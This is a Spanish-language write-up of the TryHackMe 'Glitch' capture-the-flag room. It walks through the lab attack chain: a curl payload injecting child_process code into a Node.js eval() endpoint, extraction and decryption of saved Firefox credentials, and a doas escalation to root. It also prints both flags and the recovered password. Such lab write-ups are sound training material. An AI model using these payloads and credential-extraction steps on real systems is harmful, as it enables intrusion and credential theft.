# TryHackMe - Glitch

## Target
- **IP**: `10.66.147.196`
- **Difficulty**: Easy
- **OS**: Ubuntu 18.04 (kernel 4.15.0-135-generic)

---

## Flags
- **User**: `THM{i_don't_know_why}`
- **Root**: `THM{diamonds_break_our_aching_minds}`

---

## 1. Reconocimiento

### Nmap
```bash
nmap -sC -sV -p- 10.66.147.196
```
Resultado: único puerto abierto **80** (nginx/1.14.0), reverse-proxy hacia Node.js/Express en 8080.

### DNS / Hosts
El host virtual responde a `glitch.thm`. Se agregó al `/etc/hosts`:
```
10.66.147.196 glitch.thm
```

---

## 2. Enumeración Web

### Rutas descubiertas
| Ruta | Método | Descripción |
|------|--------|-------------|
| `/api/access` | GET | Devuelve un token base64 (fake) |
| `/api/items` | POST | Endpoint vulnerable a inyección de código |
| `/` | GET | Página principal (cookie `token` requerida) |
| `/the_cookie_you_looked_for` | GET | Pista: "you have to look deep" |
| `/page_does_not_exist` | GET | Página de error que revela que usa EJS |

### Cookie obligatoria
La app requiere la cookie `token=this_is_not_real` para acceder a la mayoría de las rutas. Se obtiene de `/api/access`.

---

## 3. Explotación — RCE

### Vulnerabilidad
El endpoint `POST /api/items?cmd=<payload>` ejecuta **`eval()`** directamente con el parámetro `cmd`:

```javascript
// routes/api.js
router.post('/', function(req, res) {
    var ret = eval(req.query.cmd);
    ...
});
```

### Obtención de RCE
```bash
curl -X POST "http://glitch.thm/api/items?cmd=require('child_process').execSync('whoami').toString()" \
     -H "Cookie: token=this_is_not_real"
```

Resultado: `user` → ejecución de código como el usuario `user` (uid=1000).

---

## 4. User Flag

```bash
cat /home/user/user.txt
```
```
THM{i_don't_know_why}
```

---

## 5. Enumeración Interna

### Usuarios del sistema
- `user` (uid=1000) — donde se ejecuta la app Node.js
- `v0id` (uid=1001) — usuario secundario

### Descubrimientos clave

| Hallazgo | Ruta | Detalle |
|----------|------|---------|
| Firefox profile | `/home/user/.firefox/b5w4643p.default-release/` | Credenciales guardadas para `glitch.thm` |
| doas (SUID) | `/usr/local/bin/doas` | `-rwsr-xr-x root root` |
| doas.conf | `/usr/local/etc/doas.conf` | `permit v0id as root` |
| Código fuente doas | `/opt/doas/` | Compilado pero sin SUID (instalación incompleta) |

---

## 6. Privilege Escalation

### Cadena de ataque
```
RCE (user) → Credenciales Firefox → su v0id → doas → root
```

### Paso 1: Extraer credenciales Firefox
Se descargaron los archivos de la profile de Firefox (`key4.db`, `logins.json`, `cert9.db`) usando la RCE:

```bash
base64 /home/user/.firefox/b5w4643p.default-release/logins.json
base64 /home/user/.firefox/b5w4643p.default-release/key4.db
base64 /home/user/.firefox/b5w4643p.default-release/cert9.db
```

### Paso 2: Descifrar con firefox_decrypt
```bash
python3 firefox_decrypt.py /tmp/.ff_glitch/
```
Resultado:
```
Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```

### Paso 3: Escalar a root
```bash
# Como user, usar su para convertirse en v0id
su v0id -c 'doas sh'
# Ingresar contraseña: love_the_void
# doas pide la contraseña de v0id nuevamente: love_the_void
```

### Paso 4: Root flag
```bash
cat /root/root.txt
```
```
THM{diamonds_break_our_aching_minds}
```

---

## 7. Resumen de Técnicas MITRE ATT&CK

| Técnica | ID | Descripción |
|---------|----|-------------|
| Exploitation for Initial Access | T1190 | eval() RCE en `/api/items` |
| Command and Scripting Interpreter | T1059 | JavaScript via Node.js eval |
| Credential from Password Store | T1555.003 | Firefox saved credentials |
| Account Manipulation | T1098 | su v0id → doas root |
| Abuse Elevation Control | T1548 | doas con SUID para escalar |

---

## 8. Remediation

1. **Eliminar `eval()`**: Nunca usar eval() con entrada del usuario
2. **Autenticación real**: El middleware de cookies es trivialmente bypassable
3. **doas.conf**: Usar `nopasswd` o restricciones más granulares
4. **Firefox**: No guardar credenciales en un servidor web
5. **Principio de menor privilegio**: La app Node.js no debería ejecutarse con acceso a perfiles de Firefox del usuario
